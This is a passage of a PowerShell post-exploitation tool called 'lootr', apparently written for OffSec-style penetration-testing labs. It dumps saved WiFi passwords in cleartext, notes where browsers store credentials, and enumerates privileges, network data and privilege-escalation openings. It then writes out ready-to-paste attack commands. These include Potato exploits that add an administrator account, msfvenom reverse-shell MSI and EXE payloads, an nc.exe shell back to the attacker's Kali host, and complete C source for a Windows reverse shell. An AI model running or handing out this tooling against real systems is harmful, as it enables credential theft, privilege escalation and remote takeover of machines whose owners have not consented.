        Write-Warn "OVPN search failed: $_"
    }

    # WiFi passwords
    Write-Info "Collecting saved WiFi passwords..."
    try {
        $wifiOutput = [System.Text.StringBuilder]::new()
        $profiles = netsh wlan show profiles 2>&1
        $null = $wifiOutput.AppendLine($profiles -join "`n")
        $null = $wifiOutput.AppendLine("")

        $profileNames = $profiles | Select-String "All User Profile" |
            ForEach-Object { ($_ -split ":")[1].Trim() }
        foreach ($pn in $profileNames) {
            $null = $wifiOutput.AppendLine("=== Profile: $pn ===")
            $keyInfo = netsh wlan show profile name="$pn" key=clear 2>&1
            $null = $wifiOutput.AppendLine(($keyInfo -join "`n"))
            $null = $wifiOutput.AppendLine("")
        }
        $wifiOutput.ToString() | Out-File -Encoding UTF8 "$CDir\wifi_passwords.txt"
        $pwdLines = $wifiOutput.ToString() | Select-String "Key Content"
        if ($pwdLines) {
            Write-Success "WiFi passwords found!"
            Write-Host $pwdLines -ForegroundColor Green
        }
    } catch {
        Write-Warn "WiFi enumeration failed: $_"
    }

    # Browser profile paths (note only — no extraction)
    Write-Info "Noting browser credential paths..."
    $browserPaths = @{
        "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
        "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    }
    $browserNotes = [System.Collections.Generic.List[string]]::new()
    foreach ($browser in $browserPaths.GetEnumerator()) {
        $exists = Test-Path $browser.Value
        $browserNotes.Add("$($browser.Key): $($browser.Value) [$(if ($exists) { 'EXISTS' } else { 'not found' })]")
        if ($exists) {
            Write-Warn "$($browser.Key) profile exists: $($browser.Value)"
        }
    }
    $browserNotes | Out-File -Encoding UTF8 "$CDir\browser_credential_paths.txt"

    # SeImpersonatePrivilege check
    Write-Info "Checking for SeImpersonatePrivilege..."
    try {
        $privOutput = whoami /priv 2>&1
        $privOutput | Out-File -Encoding UTF8 "$CDir\privileges.txt"
        if ($privOutput -match "SeImpersonatePrivilege") {
            Write-Success "SeImpersonatePrivilege FOUND — possible Potato attack vector!"
        }
        if ($privOutput -match "SeAssignPrimaryTokenPrivilege") {
            Write-Success "SeAssignPrimaryTokenPrivilege FOUND — possible escalation!"
        }
        if ($privOutput -match "SeBackupPrivilege") {
            Write-Success "SeBackupPrivilege FOUND — can read SAM/SYSTEM!"
        }
        if ($privOutput -match "SeDebugPrivilege") {
            Write-Success "SeDebugPrivilege FOUND — can inject into processes!"
        }
    } catch {
        Write-Warn "Privilege check failed: $_"
    }

    Write-Success "Credentials collection complete -> $CDir\"
    Write-ProgressLog -Dir $LootDir -Status "DONE" -PhaseName "creds" -Detail "Credentials collected"
}

#==============================================================================
# PHASE 4 — NETWORK
#==============================================================================
function Invoke-PhaseNetwork {
    Write-Phase "4 — NETWORK"
    Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "network" -Detail "Collecting network information"

    $NDir = Join-Path $LootDir "network"

    # Interfaces
    Write-Info "Collecting network interfaces..."
    try {
        $null = Get-NetIPAddress 2>&1 | Format-Table InterfaceAlias, AddressFamily, IPAddress, PrefixLength -AutoSize |
            Out-File -Encoding UTF8 "$NDir\interfaces.txt"
        Write-Success "Interfaces collected"
    } catch {
        Write-Warn "Get-NetIPAddress failed, trying ipconfig..."
        ipconfig /all 2>&1 | Out-File -Encoding UTF8 "$NDir\interfaces.txt"
    }

    # Routes
    Write-Info "Collecting routing table..."
    try {
        Get-NetRoute 2>&1 | Format-Table DestinationPrefix, NextHop, RouteMetric, InterfaceAlias -AutoSize |
            Out-File -Encoding UTF8 "$NDir\routes.txt"
        Write-Success "Routes collected"
    } catch {
        Write-Warn "Get-NetRoute failed, trying route print..."
        route print 2>&1 | Out-File -Encoding UTF8 "$NDir\routes.txt"
    }

    # ARP table
    Write-Info "Collecting ARP table..."
    try {
        Get-NetNeighbor 2>&1 | Format-Table InterfaceAlias, IPAddress, LinkLayerAddress, State -AutoSize |
            Out-File -Encoding UTF8 "$NDir\arp.txt"
        Write-Success "ARP table collected"
    } catch {
        Write-Warn "Get-NetNeighbor failed, trying arp -a..."
        arp -a 2>&1 | Out-File -Encoding UTF8 "$NDir\arp.txt"
    }

    # TCP connections grouped by state
    Write-Info "Collecting TCP connections..."
    try {
        $connections = Get-NetTCPConnection -ErrorAction SilentlyContinue
        $connections | Format-Table LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess -AutoSize |
            Out-File -Encoding UTF8 "$NDir\tcp_connections.txt"

        # Internal listeners
        $internalListeners = $connections |
            Where-Object { $_.LocalAddress -eq "127.0.0.1" -and $_.State -eq "Listen" }
        if ($internalListeners) {
            $internalListeners | Format-Table LocalAddress, LocalPort, OwningProcess -AutoSize |
                Out-File -Encoding UTF8 "$NDir\internal_listeners.txt"
            Write-Warn "Internal listeners (127.0.0.1) found — potential pivot targets:"
            $internalListeners | Format-Table LocalAddress, LocalPort, OwningProcess -AutoSize |
                Write-Host -ForegroundColor Yellow
        }

        # Group by state
        $connections | Group-Object State | Select-Object Name, Count |
            Out-File -Encoding UTF8 "$NDir\connections_by_state.txt"
        Write-Success "TCP connections collected"
    } catch {
        Write-Warn "Get-NetTCPConnection failed: $_"
        netstat -ano 2>&1 | Out-File -Encoding UTF8 "$NDir\tcp_connections.txt"
    }

    # hosts file
    Write-Info "Copying hosts file..."
    try {
        Copy-Item "C:\Windows\System32\drivers\etc\hosts" "$NDir\hosts.txt" -ErrorAction SilentlyContinue
        Write-Success "hosts file copied"
    } catch {
        Write-Warn "Could not copy hosts file: $_"
    }

    # DNS servers
    Write-Info "Collecting DNS configuration..."
    try {
        Get-DnsClientServerAddress 2>&1 | Format-Table InterfaceAlias, ServerAddresses -AutoSize |
            Out-File -Encoding UTF8 "$NDir\dns_servers.txt"
        Write-Success "DNS servers collected"
    } catch {
        Write-Warn "Get-DnsClientServerAddress failed: $_"
    }

    # Firewall profiles
    Write-Info "Collecting firewall profile status..."
    try {
        Get-NetFirewallProfile 2>&1 | Format-Table Name, Enabled, DefaultInboundAction, DefaultOutboundAction -AutoSize |
            Out-File -Encoding UTF8 "$NDir\firewall_profiles.txt"
        Write-Success "Firewall profiles collected"
    } catch {
        Write-Warn "Get-NetFirewallProfile failed: $_"
        netsh advfirewall show allprofiles 2>&1 | Out-File -Encoding UTF8 "$NDir\firewall_profiles.txt"
    }

    # PSDrives and mapped drives
    Write-Info "Collecting mapped drives and PSDrives..."
    try {
        Get-PSDrive 2>&1 | Format-Table Name, Provider, Root, CurrentLocation -AutoSize |
            Out-File -Encoding UTF8 "$NDir\psdrives.txt"
        net use 2>&1 | Out-File -Encoding UTF8 "$NDir\net_use.txt"
        Write-Success "Drive info collected"
    } catch {
        Write-Warn "PSDrive collection failed: $_"
    }

    # SMB shares
    Write-Info "Collecting SMB shares..."
    try {
        Get-SmbShare 2>&1 | Format-Table Name, Path, Description -AutoSize |
            Out-File -Encoding UTF8 "$NDir\smb_shares.txt"
        Write-Success "SMB shares collected"
    } catch {
        Write-Warn "Get-SmbShare failed, trying net share..."
        net share 2>&1 | Out-File -Encoding UTF8 "$NDir\smb_shares.txt"
    }

    # Domain info
    Write-Info "Collecting domain information..."
    try {
        $domainInfo = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $domainOutput = @(
            "Domain Name: $($domainInfo.Name)",
            "Forest Name: $($domainInfo.Forest.Name)",
            "Domain Controllers: $($domainInfo.DomainControllers | ForEach-Object { $_.Name })",
            "Domain Mode: $($domainInfo.DomainMode)"
        )
        $domainOutput | Out-File -Encoding UTF8 "$NDir\domain_info.txt"
        Write-Success "Domain: $($domainInfo.Name)"
    } catch {
        Write-Info "Not domain-joined or domain query failed"
        "Not domain-joined or domain query failed" | Out-File -Encoding UTF8 "$NDir\domain_info.txt"
    }

    Write-Success "Network info complete -> $NDir\"
    Write-ProgressLog -Dir $LootDir -Status "DONE" -PhaseName "network" -Detail "Network info collected"
}

#==============================================================================
# PHASE 5 — INTERESTING FILES (privesc vectors)
#==============================================================================
function Invoke-PhaseFile {
    Write-Phase "5 — INTERESTING FILES (PRIVESC VECTORS)"
    Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "files" -Detail "Searching for privesc vectors"

    $FDir = Join-Path $LootDir "files"

    # AlwaysInstallElevated — CRITICAL privesc vector
    Write-Info "Checking AlwaysInstallElevated (CRITICAL)..."
    try {
        $aieHKLM = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" `
            -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
        $aieHKCU = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" `
            -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue

        $aieHKLMVal = if ($aieHKLM) { $aieHKLM.AlwaysInstallElevated } else { 0 }
        $aieHKCUVal = if ($aieHKCU) { $aieHKCU.AlwaysInstallElevated } else { 0 }

        $aieResult = @(
            "HKLM AlwaysInstallElevated: $aieHKLMVal",
            "HKCU AlwaysInstallElevated: $aieHKCUVal"
        )
        $aieResult | Out-File -Encoding UTF8 "$FDir\always_install_elevated.txt"

        if ($aieHKLMVal -eq 1 -and $aieHKCUVal -eq 1) {
            Write-Success "CRITICAL: AlwaysInstallElevated is ENABLED in BOTH hives — MSI privesc possible!"
        } else {
            Write-Info "AlwaysInstallElevated: HKLM=$aieHKLMVal HKCU=$aieHKCUVal (both must be 1 to exploit)"
        }
    } catch {
        Write-Warn "AlwaysInstallElevated check failed: $_"
    }

    # Writable directories in PATH
    Write-Info "Checking PATH directories for write permissions..."
    try {
        $pathDirs = $env:PATH -split ";" | Where-Object { $_ -ne "" } | Select-Object -Unique
        $writablePaths = [System.Collections.Generic.List[string]]::new()
        foreach ($pd in $pathDirs) {
            if (-not (Test-Path $pd)) { continue }
            try {
                $testFile = Join-Path $pd "lootr_test_$([System.IO.Path]::GetRandomFileName())"
                $fs = [System.IO.File]::Create($testFile)
                $fs.Close()
                Remove-Item $testFile -ErrorAction SilentlyContinue
                $writablePaths.Add("WRITABLE: $pd")
                Write-Warn "PATH dir is writable: $pd"
            } catch {
                $null = $_  # not writable — expected
            }
        }
        if ($writablePaths.Count -eq 0) {
            $writablePaths.Add("No writable PATH directories found")
        }
        $writablePaths | Out-File -Encoding UTF8 "$FDir\writable_path_dirs.txt"
    } catch {
        Write-Warn "PATH writability check failed: $_"
    }

    # Writable service binary paths
    Write-Info "Checking for writable service binary paths..."
    try {
        $services = Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
            Where-Object { $_.PathName -and $_.State -eq "Running" }
        $writableServices = [System.Collections.Generic.List[string]]::new()
        foreach ($svc in $services) {
            $binPath = Get-ExecutablePathFromCommandLine -CommandLine $svc.PathName
            if (-not (Test-Path $binPath -ErrorAction SilentlyContinue)) { continue }
            if (Test-CurrentPrincipalCanWrite -Path $binPath) {
                $writableServices.Add("WRITABLE SERVICE BINARY: $binPath ($($svc.Name))")
                Write-Warn "Writable service binary: $binPath"
            }
        }
        if ($writableServices.Count -eq 0) {
            $writableServices.Add("No writable service binaries found")
        }
        $writableServices | Out-File -Encoding UTF8 "$FDir\writable_service_binaries.txt"
    } catch {
        Write-Warn "Service binary check failed: $_"
    }

    # Writable scheduled task binaries
    Write-Info "Checking for writable scheduled task binaries..."
    try {
        $taskFindings = [System.Collections.Generic.List[string]]::new()
        $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue |
            Where-Object { $_.TaskPath -notlike "\Microsoft\*" }
        foreach ($task in $tasks) {
            $principal = $task.Principal.UserId
            if ($principal -notmatch 'SYSTEM|Administrator|Administrators') { continue }
            foreach ($action in $task.Actions) {
                $actionLine = ("{0} {1}" -f $action.Execute, $action.Arguments).Trim()
                $binPath = Get-ExecutablePathFromCommandLine -CommandLine $actionLine
                if (-not $binPath -or -not (Test-Path $binPath -ErrorAction SilentlyContinue)) { continue }
                if (Test-CurrentPrincipalCanWrite -Path $binPath) {
                    $taskName = "$($task.TaskPath)$($task.TaskName)"
                    $taskFindings.Add("WRITABLE SCHEDULED TASK BINARY: $binPath ($taskName as $principal)")
                    Write-Warn "Writable scheduled task binary: $binPath"
                }
            }
        }
        if ($taskFindings.Count -eq 0) {
            $taskFindings.Add("No writable scheduled task binaries found")
        }
        $taskFindings | Out-File -Encoding UTF8 "$FDir\writable_scheduled_task_binaries.txt"
    } catch {
        Write-Warn "Scheduled task writability check failed: $_"
    }

    # Unquoted service paths
    Write-Info "Checking for unquoted service paths..."
    try {
        $unquoted = Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
            Where-Object {
                $_.PathName -and
                $_.PathName -notmatch '^"' -and
                $_.PathName -match " " -and
                $_.PathName -match "^[A-Za-z]:\\"
            } |
            Select-Object Name, DisplayName, PathName, State, StartMode
        if ($unquoted) {
            $unquoted | Format-Table -AutoSize | Out-File -Encoding UTF8 "$FDir\unquoted_service_paths.txt"
            Write-Warn "Unquoted service paths found: $(@($unquoted).Count)"
            $unquoted | ForEach-Object { Write-Host "  $($_.Name): $($_.PathName)" -ForegroundColor Yellow }
        } else {
            "No unquoted service paths found" | Out-File -Encoding UTF8 "$FDir\unquoted_service_paths.txt"
            Write-Info "No unquoted service paths"
        }
    } catch {
        Write-Warn "Unquoted service path check failed: $_"
    }

    # Recently modified files in sensitive dirs (10 days)
    Write-Info "Finding recently modified files (10 days) in sensitive locations..."
    try {
        $cutoff = (Get-Date).AddDays(-10)
        $sensitiveDirs = @("C:\Windows\System32", "C:\inetpub", "C:\xampp", "C:\Users\*\Desktop", "C:\Users\*\Documents")
        $recentFiles = [System.Collections.Generic.List[string]]::new()
        foreach ($sd in $sensitiveDirs) {
            try {
                $items = Get-ChildItem -Path $sd -Recurse -File -ErrorAction SilentlyContinue |
                    Where-Object { $_.LastWriteTime -gt $cutoff } |
                    Select-Object -First 30
                foreach ($item in $items) {
                    $recentFiles.Add("$($item.LastWriteTime.ToString('yyyy-MM-dd HH:mm')) $($item.FullName)")
                }
            } catch { $null = $_ }
        }
        $recentFiles | Out-File -Encoding UTF8 "$FDir\recently_modified.txt"
        Write-Success "Recently modified files: $($recentFiles.Count)"
    } catch {
        Write-Warn "Recently modified files search failed: $_"
    }

    # Backup and DB files
    Write-Info "Searching for backup and database files..."
    try {
        $backupExts = @("*.bak","*.old","*.backup","*.sql","*.dump","*.db","*.sqlite","*.sqlite3")
        $searchRoots = @("C:\inetpub","C:\xampp","C:\Users","C:\Backup","C:\")
        $backupFiles = [System.Collections.Generic.List[string]]::new()
        foreach ($root in $searchRoots) {
            if (-not (Test-Path $root)) { continue }
            try {
                $items = Get-ChildItem -Path $root -Recurse -Include $backupExts `
                    -ErrorAction SilentlyContinue | Select-Object -First 30
                foreach ($item in $items) {
                    $backupFiles.Add($item.FullName)
                }
            } catch { $null = $_ }
        }
        $backupFiles | Out-File -Encoding UTF8 "$FDir\backup_db_files.txt"
        if ($backupFiles.Count -gt 0) {
            Write-Success "Backup/DB files found: $($backupFiles.Count)"
        }
    } catch {
        Write-Warn "Backup file search failed: $_"
    }

    # Scripts in key locations
    Write-Info "Searching for scripts in key locations..."
    try {
        $scriptLocs = @("C:\Scripts","C:\","C:\Windows\Temp","C:\Users\*\Desktop")
        $scriptExts = @("*.ps1","*.bat","*.cmd","*.vbs","*.py","*.rb")
        $scriptFiles = [System.Collections.Generic.List[string]]::new()
        foreach ($loc in $scriptLocs) {
            try {
                $items = Get-ChildItem -Path $loc -Include $scriptExts `
                    -ErrorAction SilentlyContinue -Depth 2
                foreach ($item in $items) {
                    $scriptFiles.Add($item.FullName)
                }
            } catch { $null = $_ }
        }
        $scriptFiles | Out-File -Encoding UTF8 "$FDir\scripts.txt"
        if ($scriptFiles.Count -gt 0) {
            Write-Success "Scripts found: $($scriptFiles.Count)"
        }
    } catch {
        Write-Warn "Script search failed: $_"
    }

    # DLL hijack — writable dirs in running process paths
    Write-Info "Checking for writable directories in running process paths (DLL hijack)..."
    try {
        $procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path }
        $dllHijack = [System.Collections.Generic.List[string]]::new()
        $checkedDirs = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
        foreach ($proc in $procs) {
            $procDir = Split-Path $proc.Path -Parent -ErrorAction SilentlyContinue
            if (-not $procDir -or -not (Test-Path $procDir -ErrorAction SilentlyContinue)) { continue }
            if (-not $checkedDirs.Add($procDir)) { continue }
            try {
                $testFile = Join-Path $procDir "lootr_dlltest_$([System.IO.Path]::GetRandomFileName())"
                $fs = [System.IO.File]::Create($testFile)
                $fs.Close()
                Remove-Item $testFile -ErrorAction SilentlyContinue
                $dllHijack.Add("WRITABLE: $procDir (process: $($proc.Name))")
                Write-Warn "Writable process dir (DLL hijack): $procDir"
            } catch { $null = $_ }
        }
        if ($dllHijack.Count -eq 0) {
            $dllHijack.Add("No writable process directories found")
        }
        $dllHijack | Out-File -Encoding UTF8 "$FDir\dll_hijack_candidates.txt"
    } catch {
        Write-Warn "DLL hijack check failed: $_"
    }

    Write-Success "File enumeration complete -> $FDir\"
    Write-ProgressLog -Dir $LootDir -Status "DONE" -PhaseName "files" -Detail "Privesc vector enumeration complete"
}

#==============================================================================
# SUMMARY GENERATION
#==============================================================================
function Invoke-Summary {
    Write-Info "Generating summary.txt..."
    $SFile = Join-Path $LootDir "summary.txt"

    $sb = [System.Text.StringBuilder]::new()
    $null = $sb.AppendLine("============================================================")
    $null = $sb.AppendLine("  LOOTR SUMMARY — $HostShort")
    $null = $sb.AppendLine("  Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
    $null = $sb.AppendLine("  Running as: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)")
    $null = $sb.AppendLine("============================================================")
    $null = $sb.AppendLine("")

    # Proof flags
    $null = $sb.AppendLine("[ PROOF FLAGS ]")
    $null = $sb.AppendLine("------------------------------------------------------------")
    $proofDir = Join-Path $LootDir "proof"
    $proofFiles = Get-ChildItem $proofDir -File -ErrorAction SilentlyContinue
    if ($proofFiles) {
        foreach ($pf in $proofFiles) {
            $null = $sb.AppendLine("  Flag: $($pf.Name)")
            $content = Get-Content $pf.FullName -ErrorAction SilentlyContinue
            $null = $sb.AppendLine("  Content: $($content -join ' ')")
            $null = $sb.AppendLine("")
        }
    } else {
        $null = $sb.AppendLine("  No proof flags found")
    }
    $null = $sb.AppendLine("")

    # AlwaysInstallElevated
    $null = $sb.AppendLine("[ ALWAYSINSTALLELEVATED (CRITICAL PRIVESC) ]")
    $null = $sb.AppendLine("------------------------------------------------------------")
    $aiePath = Join-Path $LootDir "files\always_install_elevated.txt"
    if (Test-Path $aiePath) {
        Get-Content $aiePath -ErrorAction SilentlyContinue |
            ForEach-Object { $null = $sb.AppendLine("  $_") }
    } else {
        $null = $sb.AppendLine("  Not checked")
    }
    $null = $sb.AppendLine("")

    # SeImpersonatePrivilege
    $null = $sb.AppendLine("[ DANGEROUS PRIVILEGES ]")
    $null = $sb.AppendLine("------------------------------------------------------------")
    $privPath = Join-Path $LootDir "creds\privileges.txt"
    if (Test-Path $privPath) {
        $privContent = Get-Content $privPath -ErrorAction SilentlyContinue
        $dangerous = $privContent | Select-String "SeImpersonate|SeAssignPrimary|SeBackup|SeDebug|SeTakeOwnership|SeLoadDriver"
        if ($dangerous) {
            $dangerous | ForEach-Object { $null = $sb.AppendLine("  [!] $_") }
        } else {
            $null = $sb.AppendLine("  No dangerous privileges detected")
        }
    } else {
        $null = $sb.AppendLine("  Privileges not collected")
    }
    $null = $sb.AppendLine("")

    # Unquoted service paths
    $null = $sb.AppendLine("[ UNQUOTED SERVICE PATHS ]")
    $null = $sb.AppendLine("------------------------------------------------------------")
    $uqPath = Join-Path $LootDir "files\unquoted_service_paths.txt"
    if (Test-Path $uqPath) {
        Get-Content $uqPath -ErrorAction SilentlyContinue |
            ForEach-Object { $null = $sb.AppendLine("  $_") }
    } else {
        $null = $sb.AppendLine("  Not checked")
    }
    $null = $sb.AppendLine("")

    # Internal listeners
    $null = $sb.AppendLine("[ INTERNAL LISTENERS (127.0.0.1 — pivot candidates) ]")
    $null = $sb.AppendLine("------------------------------------------------------------")
    $ilPath = Join-Path $LootDir "network\internal_listeners.txt"
    if (Test-Path $ilPath) {
        Get-Content $ilPath -ErrorAction SilentlyContinue |
            ForEach-Object { $null = $sb.AppendLine("  $_") }
    } else {
        $null = $sb.AppendLine("  None identified")
    }
    $null = $sb.AppendLine("")

    # Stored credentials
    $null = $sb.AppendLine("[ STORED CREDENTIALS (cmdkey) ]")
    $null = $sb.AppendLine("------------------------------------------------------------")
    $ckPath = Join-Path $LootDir "creds\cmdkey_list.txt"
    if (Test-Path $ckPath) {
        Get-Content $ckPath -ErrorAction SilentlyContinue |
            Select-String "Target:|User:|Type:" |
            ForEach-Object { $null = $sb.AppendLine("  $_") }
    } else {
        $null = $sb.AppendLine("  Not collected")
    }
    $null = $sb.AppendLine("")

    # WiFi passwords
    $null = $sb.AppendLine("[ WIFI PASSWORDS ]")
    $null = $sb.AppendLine("------------------------------------------------------------")
    $wifiPath = Join-Path $LootDir "creds\wifi_passwords.txt"
    if (Test-Path $wifiPath) {
        Get-Content $wifiPath -ErrorAction SilentlyContinue |
            Select-String "Key Content" |
            ForEach-Object { $null = $sb.AppendLine("  $_") }
        $noWifi = (Get-Content $wifiPath -ErrorAction SilentlyContinue | Select-String "Key Content").Count -eq 0
        if ($noWifi) { $null = $sb.AppendLine("  No WiFi passwords recovered") }
    } else {
        $null = $sb.AppendLine("  Not collected")
    }
    $null = $sb.AppendLine("")

    # DLL hijack / writable service binaries
    $null = $sb.AppendLine("[ DLL HIJACK / WRITABLE SERVICE BINARIES ]")
    $null = $sb.AppendLine("------------------------------------------------------------")
    $dllPath = Join-Path $LootDir "files\dll_hijack_candidates.txt"
    $wsPath  = Join-Path $LootDir "files\writable_service_binaries.txt"
    $wstPath = Join-Path $LootDir "files\writable_scheduled_task_binaries.txt"
    foreach ($fp in @($dllPath, $wsPath, $wstPath)) {
        if (Test-Path $fp) {
            Get-Content $fp -ErrorAction SilentlyContinue |
                Where-Object { $_ -match "WRITABLE" } |
                ForEach-Object { $null = $sb.AppendLine("  [!] $_") }
        }
    }
    $null = $sb.AppendLine("")

    $null = $sb.AppendLine("============================================================")
    $null = $sb.AppendLine("  Full data in: $LootDir\")
    $null = $sb.AppendLine("  ★ next_steps.txt — resolved exploit commands per finding")
    $null = $sb.AppendLine("============================================================")

    $sb.ToString() | Out-File -Encoding UTF8 $SFile
    Write-Success "Summary written -> $SFile"
    Write-Host ""
    Get-Content $SFile | Write-Host
}

#==============================================================================
# ATTACK COMMANDS GENERATION
# Generates next_steps.txt and attack_commands.txt — resolved exploit commands for each finding.
# Mirrors the pattern used by lootr.sh on Linux.
#==============================================================================
function Invoke-AttackCommands {
    $AFile = Join-Path $LootDir "attack_commands.txt"
    $NFile = Join-Path $LootDir "next_steps.txt"
    $sb = [System.Text.StringBuilder]::new()
    $HasActions = $false

    $null = $sb.AppendLine("============================================================")
    $null = $sb.AppendLine("  LOOTR ATTACK COMMANDS — $HostShort")
    $null = $sb.AppendLine("  ★ START HERE — copy-paste these on Kali")
    $null = $sb.AppendLine("  Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
    $null = $sb.AppendLine("============================================================")
    $null = $sb.AppendLine("")
    $null = $sb.AppendLine("# OffSec RULE: Metasploit (msfvenom / msfconsole / meterpreter)")
    $null = $sb.AppendLine("# is limited to ONE target across the entire engagement.")
    $null = $sb.AppendLine("# Prefer the manual alternative listed next to each msfvenom line:")
    $null = $sb.AppendLine("#   - EXE revshell:  x86_64-w64-mingw32-gcc revshell.c -o shell.exe")
    $null = $sb.AppendLine("#   - DLL revshell:  x86_64-w64-mingw32-gcc -shared revshell.c -o r.dll")
    $null = $sb.AppendLine("#   - MSI payload:   WixSharp, or hand-roll WiX XML + candle.exe/light.exe")
    $null = $sb.AppendLine("#   - PowerShell:    Invoke-PowerShellTcp.ps1 (nishang)")
    $null = $sb.AppendLine("#                    or powercat -c $KaliIp -p 4444 -e powershell")
    $null = $sb.AppendLine("# Save your one MSF use for a target that truly needs it.")
    $null = $sb.AppendLine("")

    # ── SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege ────────────────
    $privPath = Join-Path $LootDir "creds\privileges.txt"
    if (Test-Path $privPath) {
        $privContent = Get-Content $privPath -ErrorAction SilentlyContinue
        $hasPotato = $privContent | Select-String "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege"
        if ($hasPotato) {
            $HasActions = $true
            $null = $sb.AppendLine("[ SeImpersonatePrivilege — POTATO ATTACK ]")
            $null = $sb.AppendLine("  # Transfer binary from Kali (already in ~/tools/windows/):")
            $null = $sb.AppendLine("  # GodPotato (most reliable, Win10/2019+):")
            $null = $sb.AppendLine("  GodPotato-NET4.exe -cmd 'cmd /c whoami'")
            $null = $sb.AppendLine("  GodPotato-NET4.exe -cmd 'cmd /c net user hacker P@ssword1 /add && net localgroup administrators hacker /add'")
            $null = $sb.AppendLine("  # PrintSpoofer (Win10/2019 with print spooler running):")
            $null = $sb.AppendLine("  PrintSpoofer64.exe -i -c cmd")
            $null = $sb.AppendLine("  PrintSpoofer64.exe -c 'net user hacker P@ssword1 /add'")
            $null = $sb.AppendLine("  # SigmaPotato (fallback — .NET reflection, no file drop):")
            $null = $sb.AppendLine("  SigmaPotato.exe 'net user hacker P@ssword1 /add'")
            $null = $sb.AppendLine("")
        }
    }

    # ── AlwaysInstallElevated ─────────────────────────────────────────────────
    $aiePath = Join-Path $LootDir "files\always_install_elevated.txt"
    if (Test-Path $aiePath) {
        $aieContent = Get-Content $aiePath -ErrorAction SilentlyContinue
        $hklmEnabled = [bool]($aieContent | Select-String -Pattern '^HKLM AlwaysInstallElevated:\s*(1|0x1)\s*$')
        $hkcuEnabled = [bool]($aieContent | Select-String -Pattern '^HKCU AlwaysInstallElevated:\s*(1|0x1)\s*$')
        if ($hklmEnabled -and $hkcuEnabled) {
            $HasActions = $true
            $null = $sb.AppendLine("[ AlwaysInstallElevated — MSI PRIVESC ]")
            $null = $sb.AppendLine("  # On Kali — start listener first:")
            $null = $sb.AppendLine("  penelope -p 4444 -O")
            $null = $sb.AppendLine("  # Option A — msfvenom MSI (costs your 1 MSF use):")
            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f msi -o privesc.msi")
            $null = $sb.AppendLine("  # Option B — manual MSI with WixSharp (no MSF):")
            $null = $sb.AppendLine("  #   1. Write a .cs that calls: Process.Start(`"cmd.exe`", `"/c nc.exe $KaliIp 4444 -e cmd.exe`")")
            $null = $sb.AppendLine("  #   2. wix build msi.cs  ->  privesc.msi")
            $null = $sb.AppendLine("  # Option C — manual MSI via WiX toolset (candle/light):")
            $null = $sb.AppendLine("  #   candle.exe privesc.wxs && light.exe privesc.wixobj -o privesc.msi")
            $null = $sb.AppendLine("  # Transfer to target and run as current user (installs as SYSTEM):")
            $null = $sb.AppendLine("  msiexec /quiet /qn /i privesc.msi")
            $null = $sb.AppendLine("")
        }
    }

    # ── Unquoted Service Paths ────────────────────────────────────────────────
    $uqPath = Join-Path $LootDir "files\unquoted_service_paths.txt"
    if (Test-Path $uqPath) {
        $uqContent = Get-Content $uqPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "\S" }
        if ($uqContent) {
            $HasActions = $true
            $null = $sb.AppendLine("[ UNQUOTED SERVICE PATHS ]")
            foreach ($svc in $uqContent | Select-Object -First 3) {
                $null = $sb.AppendLine("  $svc")
            }
            $null = $sb.AppendLine("  # On Kali — start listener first:")
            $null = $sb.AppendLine("  penelope -p 4444 -O")
            $null = $sb.AppendLine("  # Option A — msfvenom EXE (costs your 1 MSF use):")
            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f exe -o shell.exe")
            $null = $sb.AppendLine("  # Option B — manual EXE revshell with mingw (no MSF):")
            $null = $sb.AppendLine("  cat > revshell.c <<'EOF'")
            $null = $sb.AppendLine("  #include <winsock2.h>")
            $null = $sb.AppendLine("  #include <windows.h>")
            $null = $sb.AppendLine("  #pragma comment(lib,`"ws2_32`")")
            $null = $sb.AppendLine("  int main(){ WSADATA w; WSAStartup(MAKEWORD(2,2),&w);")
            $null = $sb.AppendLine("    SOCKET s=WSASocket(AF_INET,SOCK_STREAM,0,0,0,0);")
            $null = $sb.AppendLine("    struct sockaddr_in a={0}; a.sin_family=AF_INET; a.sin_port=htons(4444);")
            $null = $sb.AppendLine("    a.sin_addr.s_addr=inet_addr(`"$KaliIp`");")
            $null = $sb.AppendLine("    connect(s,(struct sockaddr*)&a,sizeof(a));")
            $null = $sb.AppendLine("    STARTUPINFO si={0}; si.cb=sizeof(si); si.dwFlags=STARTF_USESTDHANDLES;")
            $null = $sb.AppendLine("    si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)s;")
            $null = $sb.AppendLine("    PROCESS_INFORMATION pi; CreateProcessA(0,`"cmd.exe`",0,0,TRUE,0,0,0,&si,&pi);")
            $null = $sb.AppendLine("    return 0; }")
            $null = $sb.AppendLine("  EOF")
            $null = $sb.AppendLine("  x86_64-w64-mingw32-gcc revshell.c -o shell.exe -lws2_32")
            $null = $sb.AppendLine("  # Copy to path segment (e.g. C:\Program.exe or C:\Program Files\Vuln.exe)")
            $null = $sb.AppendLine("  # Check service name from table above, then restart it:")
            $null = $sb.AppendLine("  sc stop <ServiceName> ; sc start <ServiceName>")
            $null = $sb.AppendLine("")
        }
    }

